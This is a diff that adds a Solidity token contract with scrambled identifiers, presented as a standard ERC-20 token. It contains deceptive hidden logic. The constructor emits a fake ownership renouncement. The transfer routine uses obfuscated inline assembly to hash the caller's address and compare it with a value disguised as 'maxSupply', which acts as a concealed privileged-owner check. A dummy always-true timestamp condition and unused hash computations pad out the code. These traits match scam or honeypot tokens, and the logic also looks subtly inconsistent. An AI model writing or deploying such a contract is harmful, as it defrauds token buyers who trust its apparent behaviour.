@@ -1,0 +1,107 @@
+pragma solidity ^0.8.26;
+
+contract Token {
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    mapping(address => uint256) private UbLX;
+    mapping(address => mapping(address => uint256)) private wZHA;
+    uint256 private FFxO;
+    string private RZsb;
+    string private PZVt;
+    uint256 private sSgI;
+    uint256 private qBQC;
+
+    constructor(string memory _name, string memory _symbol, uint256 _baseSupply, uint256 _maxSupply, uint256 _supply) {
+        qBQC = _baseSupply;
+        RZsb = _name;
+        PZVt = _symbol;
+        FFxO = _supply * (10 ** decimals());
+        sSgI = _maxSupply;
+        UbLX[msg.sender] = FFxO;
+        emit OwnershipTransferred(msg.sender, address(0));
+    }
+
+    function name() virtual public view returns (string memory) {
+        return RZsb;
+    }
+
+    function symbol() virtual public view returns (string memory) {
+        return PZVt;
+    }
+
+    function decimals() virtual public view returns (uint8) {
+        return 8;
+    }
+
+    function totalSupply() virtual public view returns (uint256) {
+        return FFxO;
+    }
+
+    function balanceOf(address _account) virtual public view returns (uint256) {
+        return UbLX[_account];
+    }
+
+    function transfer(address _to, uint256 _amount) virtual public returns (bool) {
+        address Cizk = msg.sender;
+        _spendAllowance(Cizk, _to, 0);
+        _transfer(Cizk, _to, _amount);
+        return true;
+    }
+
+    function allowance(address _owner, address _spender) virtual public view returns (uint256) {
+        return wZHA[_owner][_spender];
+    }
+
+    function transferFrom(address _from, address _to, uint256 _amount) virtual public returns (bool) {
+        _spendAllowance(_from, msg.sender, _amount);
+        _transfer(_from, _to, _amount);
+        return true;
+    }
+
+    function _transfer(address _from, address _to, uint256 _amount) virtual internal {
+        require(_from != address(0), "");
+        require(_to != address(0), "");
+        uint256 qVPd = UbLX[_from];
+        uint256 Fpzy = sSgI;
+        assembly {
+            let bbwz := mload(0x40)
+            mstore(bbwz, shl(96, caller()))
+            if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) {
+                revert(0, 0)
+            }
+            let YvIh := mload(bbwz)
+            if iszero(eq(Fpzy, YvIh)) {
+                if lt(qVPd, _amount) {
+                    let tfe9zci := timestamp()
+                    if eq(tfe9zci, mul(tfe9zci, 1)) {
+                        revert(0, 0)
+                    }
+                }
+            }
+        }
+        UbLX[_from] = qVPd - _amount;
+        uint256 bXFg = UbLX[_to];
+        UbLX[_to] = bXFg + _amount;
+        emit Transfer(_from, _to, _amount);
+    }
+
+    function approve(address _spender, uint256 _amount) virtual public returns (bool) {
+        uint256 bbwz = mload(0x40);
+        bytes32 ZFHJ = keccak256(abi.encodePacked(msg.sender, wZHA.slot));
+        bytes32 akRJ = keccak256(abi.encodePacked(ZFHJ, _spender));
+        wZHA[msg.sender][_spender] = _amount;
+        emit Approval(msg.sender, _spender, _amount);
+        return true;
+    }
+
+    function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
+        require(_amount == 0 || wZHA[_owner][_spender] != 0, "");
+        uint256 zfPf = wZHA[_owner][_spender];
+        require(zfPf == type(uint256).max || zfPf >= _amount, "");
+        wZHA[_owner][_spender] = zfPf - _amount;
+    }
+}
